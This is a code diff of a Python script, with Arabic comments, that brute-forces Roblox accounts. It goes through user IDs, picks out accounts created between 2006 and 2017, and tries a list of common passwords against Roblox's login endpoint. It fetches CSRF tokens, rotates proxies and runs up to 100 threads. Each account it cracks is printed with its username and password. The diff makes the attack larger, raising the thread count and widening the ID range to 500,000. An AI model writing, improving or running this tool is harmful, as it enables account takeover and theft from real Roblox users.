@@ -1,14 +1,14 @@
 import requests
 import threading
 import random
-import time
+import sys
 from concurrent.futures import ThreadPoolExecutor
 from colorama import Fore, Style, init
 
-# تهيئة الألوان لبيئة iSH
+# تهيئة الألوان
 init(autoreset=True)
 
-# --- قائمة الباسوردات المحدثة (كل القائمة التي أرسلتها) ---
+# --- قائمة الباسوردات ---
 PASSWORDS = [
     "123456", "admin", "12345678", "123456789", "12345", "password", "Aa123456",
     "1234567890", "Pass@123", "admin123", "1234567", "123123", "111111", 
@@ -44,9 +44,9 @@ PASSWORDS = [
     "aaaa1111", "Abc123", "q1w2e3r4t5", "987654", "aa123123", "azerty123",
     "Aa1234567", "abc@123", "changeme", "12345678@", "P@55w0rd", "asd12345",
     "zxcvbnm123", "123admin", "Roblox123", "Roblox", "Roblox1234", "Roblox12345"
-] # (تم اختصارها هنا، لكن الكود سيقبل كل ما تضعه)
+]
 
-class Z7F_Advanced:
+class Z7F_Professional:
     def __init__(self):
         self.proxies = self._get_proxies()
         self.checked = 0
@@ -61,6 +61,7 @@ class Z7F_Advanced:
             return []
 
     def get_proxy(self):
+        if not self.proxies: return None
         p = random.choice(self.proxies)
         return {"http": f"http://{p}", "https": f"http://{p}"}
 
@@ -70,7 +71,6 @@ class Z7F_Advanced:
         session.proxies.update(proxy)
         
         try:
-            # جلب معلومات المستخدم
             u_data = session.get(f"https://users.roblox.com/v1/users/{user_id}", timeout=5).json()
             user = u_data.get("name")
             if not user or u_data.get("isBanned"): return
@@ -78,13 +78,15 @@ class Z7F_Advanced:
             year = int(u_data.get("created", "2099").split("-")[0])
 
             if 2006 <= year <= 2017:
-                # تجربة كل باسورد في القائمة بلا استثناء
                 for pwd in PASSWORDS:
+                    # تحديث شريط الحالة في سطر واحد ثابت بالأسفل
                     with self.lock:
                         self.checked += 1
-                        print(f"{Fore.YELLOW}\r[*] Scanning ID: {user_id} | Checked: {self.checked} | Hits: {self.hits} | Trying: {pwd[:5]}..", end="")
+                        status = f"{Fore.CYAN}[*] ID: {user_id} | User: {user} | Pass: {pwd[:8]}.. | Hits: {self.hits}"
+                        sys.stdout.write(f"\r{status}\033[K")
+                        sys.stdout.flush()
 
-                    # نظام تخطي الحماية بـ CSRF
+                    # إحضار CSRF Token
                     t_req = session.post("https://auth.roblox.com/v2/login", timeout=5)
                     token = t_req.headers.get("x-csrf-token")
                     
@@ -102,21 +104,23 @@ class Z7F_Advanced:
             pass
 
     def _log_hit(self, info, pwd, year):
-        print(f"\n\n{Fore.GREEN}[!] HIT FOUND!")
-        print(f"{Fore.CYAN}NickName : {info.get('displayName')}")
-        print(f"{Fore.CYAN}User     : {info.get('name')}")
-        print(f"{Fore.CYAN}Password : {pwd}")
-        print(f"{Fore.CYAN}Year     : {year}")
-        print(f"{Fore.CYAN}ID       : {info.get('id')}")
-        print(f"{Fore.CYAN}Bio      : {info.get('description', 'None')}")
-        print(f"{Fore.GREEN}{'='*35}\n")
+        # مسح السطر الحالي للطباعة بوضوح
+        sys.stdout.write("\r\033[K") 
+        print(f"\n{Fore.GREEN}[+] HIT FOUND!")
+        print(f"{Fore.WHITE}NickName : {info.get('displayName')}")
+        print(f"{Fore.WHITE}User     : {info.get('name')}")
+        print(f"{Fore.WHITE}Password : {pwd}")
+        print(f"{Fore.WHITE}Year     : {year}")
+        print(f"{Fore.WHITE}ID       : {info.get('id')}")
+        print(f"{Fore.WHITE}Bio      : {info.get('description', 'None')}")
+        print(f"{Fore.GREEN}{'='*30}\n")
 
     def start(self, r_start, r_end):
-        print(f"{Fore.MAGENTA}[*] Z7F Apocalypse Max is Running...")
-        with ThreadPoolExecutor(max_workers=60) as executor:
+        print(f"{Fore.MAGENTA}[!] Starting Z7F Apocalypse Engine...\n")
+        with ThreadPoolExecutor(max_workers=100) as executor:
             executor.map(self.check_id, range(r_start, r_end))
 
 if __name__ == "__main__":
-    bot = Z7F_Advanced()
-    # يبدأ الفحص من ID رقم 1 (أقدم حسابات) وحتى 200,000
-    bot.start(1, 200000)
+    bot = Z7F_Professional()
+    # الفحص من ID 1 إلى 500,000
+    bot.start(1, 500000)
